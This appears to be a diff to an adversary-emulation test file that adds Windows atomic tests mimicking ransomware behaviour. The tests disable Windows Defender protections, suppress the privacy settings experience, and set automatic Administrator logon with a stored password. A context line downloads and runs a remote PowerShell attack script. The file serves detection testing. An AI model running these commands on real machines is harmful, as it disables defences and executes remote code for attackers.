@@ -644,3 +644,87 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       inv-phantom -consoleoutput -noninteractive  
     name: powershell
+- name: Tamper with Windows Defender ATP using Aliases - PowerShell
+  auto_generated_guid: c531aa6e-9c97-4b29-afee-9b7be6fc8a64
+  description: |
+    Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled
+    in Windows settings.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Set-MpPreference -drtm $True
+      Set-MpPreference -dbm $True
+      Set-MpPreference -dscrptsc $True
+      Set-MpPreference -dbaf $True
+    cleanup_command: |
+      Set-MpPreference -drtm 0
+      Set-MpPreference -dbm 0
+      Set-MpPreference -dscrptsc 0
+      Set-MpPreference -dbaf 0
+    name: powershell
+    elevation_required: true
+- name: LockBit Black - Disable Privacy Settings Experience Using Registry -cmd
+  auto_generated_guid: d6d22332-d07d-498f-aea0-6139ecb7850e
+  description: |
+     LockBit Black - Disable Privacy Settings Experience Using Registry
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg add "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
+    cleanup_command: |
+       reg delete "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: LockBit Black - Use Registry Editor to turn on automatic logon -cmd
+  auto_generated_guid: 9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70
+  description: |
+     LockBit Black - Use Registry Editor to turn on automatic logon
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 1 /f
+      reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d Administrator /f
+      reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d contoso.com /f
+      reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d password1 /f
+    cleanup_command: |
+      reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /f >nul 2>&1
+      reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /f >nul 2>&1
+      reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /f >nul 2>&1
+      reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell
+  auto_generated_guid: d8c57eaa-497a-4a08-961e-bd5efd7c9374
+  description: |
+     LockBit Black - Disable Privacy Settings Experience Using Registry
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      New-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 0 -Force
+    cleanup_command: |
+      Remove-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\OOBE" -Name DisablePrivacyExperience -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell
+  auto_generated_guid: 5e27f36d-5132-4537-b43b-413b0d5eec9a
+  description: |
+     Lockbit Black - Use Registry Editor to turn on automatic logon
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force
+      New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value Administrator -Force
+      New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Value contoso.com -Force
+      New-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword  -Value password1 -Force
+    cleanup_command: |
+      Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Force -ErrorAction Ignore
+      Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Force -ErrorAction Ignore
+      Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Force -ErrorAction Ignore
+      Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
